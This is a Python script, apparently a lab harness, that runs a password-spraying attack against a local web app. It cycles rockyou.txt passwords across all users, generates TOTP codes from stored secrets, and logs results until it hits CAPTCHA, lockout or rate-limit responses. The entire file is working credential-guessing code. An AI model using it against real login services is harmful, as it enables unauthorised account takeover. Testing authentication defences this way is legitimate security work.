# password spraying attack
import requests
import time
import json
import os
import pyotp
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(__file__))
BASE_URL = "http://127.0.0.1:5000"
USERS_FILE = os.path.join(BASE_DIR, "data", "users.json")
LOG_FILE = os.path.join(BASE_DIR, "logs", "attempts.log")
WORDLIST_PATH = os.path.join(BASE_DIR, "data", "rockyou.txt")

def load_wordlist(limit=50000):
    """Load up to limit passwords from rockyou.txt"""
    with open(WORDLIST_PATH, "r", encoding="latin-1") as f:
        return [line.strip() for line in f if line.strip()][:limit]

def load_users():
    with open(USERS_FILE, "r") as f:
        return json.load(f)

def password_spray():
    users = load_users()
    common_passwords = load_wordlist()

    for pwd in common_passwords:
        print(f"\n[INFO] Trying common password: {pwd}")
        for user in users:
            username = user["username"]
            hash_mode = user.get("hash_mode", "sha256")
            start = time.time()
            if user.get("totp_secret"):
                # for strong users we use /login_totp
                code = pyotp.TOTP(user["totp_secret"]).now()
                resp = requests.post(f"{BASE_URL}/login_totp", json={
                    "username": username,
                    "password": pwd,
                    "totp": code
                })
            else:
                # for weak/medium users we use normal login
                resp = requests.post(f"{BASE_URL}/login", json={
                    "username": username,
                    "password": pwd
                })
            latency_ms = int((time.time() - start) * 1000)

            if resp.status_code == 403 and "captcha_required" in resp.text:
                print(f"[CAPTCHA] {username} blocked, stopping attempts for this user.")
                break  

            if resp.status_code == 429:
                print("[RATE LIMIT] Global block triggered, stopping experiment.")
                return  

            if resp.status_code == 403 and "Account locked" in resp.text:
                print(f"[LOCKOUT] {username} locked, stopping attempts for this user.")
                break  
            
            if resp.status_code == 200:
                result = "SUCCESS"
                print(f"[SUCCESS] {username} authenticated with password '{pwd}' (latency {latency_ms} ms)")
                break
            else:
                result = "FAILED"
                print(f"[FAILED] {username} with '{pwd}' (latency {latency_ms} ms)")

            entry = {
                "timestamp": datetime.now().isoformat(),
                "username": username,
                "hash_mode": hash_mode,
                "result": result,
                "latency_ms": latency_ms
            }
            with open(LOG_FILE, "a") as f:
                f.write(json.dumps(entry) + "\n")

if __name__ == "__main__":
    password_spray()
